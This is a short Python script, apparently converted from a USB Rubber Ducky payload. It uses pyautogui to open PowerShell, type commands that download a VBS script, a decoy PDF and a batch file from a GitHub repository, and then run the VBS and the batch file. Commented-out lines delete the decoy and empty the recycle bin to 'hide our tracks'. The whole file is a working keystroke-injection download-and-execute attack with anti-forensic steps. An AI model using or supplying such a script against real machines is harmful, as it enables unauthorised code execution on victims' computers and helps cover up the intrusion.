# Converted using ducky2python by CedArctic (https://github.com/CedArctic/ducky2python) 
import pyautogui
import time

# open powershell
pyautogui.hotkey("win")
time.sleep(0.5)
pyautogui.typewrite("powershell")
pyautogui.hotkey("enter")
time.sleep(0.5)

# download dummy doc and payload (final report)
pyautogui.typewrite("Invoke-WebRequest -Uri \"https://github.com/hanselopolis/Paperboy/blob/paperduck/paperduck_error.vbs?raw=true\" -OutFile \"c:\\Users\\$env:username\\Downloads\\paperduck_error.vbs\"")
pyautogui.hotkey("enter")
time.sleep(0.5)
pyautogui.typewrite("Invoke-WebRequest -Uri \"https://github.com/hanselopolis/Paperboy/blob/paperduck/placeholder.pdf?raw=true\" -OutFile \"c:\\Users\\$env:username\\Downloads\\finalreport_HAmelang.pdf\"")
pyautogui.hotkey("enter")
time.sleep(0.5)
pyautogui.typewrite("Invoke-WebRequest -Uri \"https://github.com/hanselopolis/Paperboy/blob/paperduck/paperduck_remove.bat?raw=true\" -OutFile \"c:\\Users\\$env:username\\Downloads\\cleaner.bat\"")
pyautogui.hotkey("enter")
time.sleep(.5)

# go to downloads folder
pyautogui.typewrite("cd c:\\Users\\$env:username\\Downloads")
pyautogui.hotkey("enter")
time.sleep(0.5)

# activate the error message
pyautogui.typewrite(".\\paperduck_error.vbs")
pyautogui.hotkey("enter")
pyautogui.typewrite(".\\cleaner.bat")
pyautogui.hotkey("enter")
pyautogui.typewrite("exit")
pyautogui.hotkey("enter")

# switch back to powershell window
#pyautogui.hotkey("alt","tab")
# delete exploit file and empty recycle bin to hide our tracks a little
#pyautogui.typewrite("rm c:\\Users\\$env:username\\Downloads\\finalreport_HAmelang.pdf")
#pyautogui.hotkey("enter")
#pyautogui.typewrite("Clear-RecycleBin")
#pyautogui.hotkey("enter")
#pyautogui.typewrite("y")
#pyautogui.hotkey("enter")
#pyautogui.typewrite("exit")
#pyautogui.hotkey("enter")
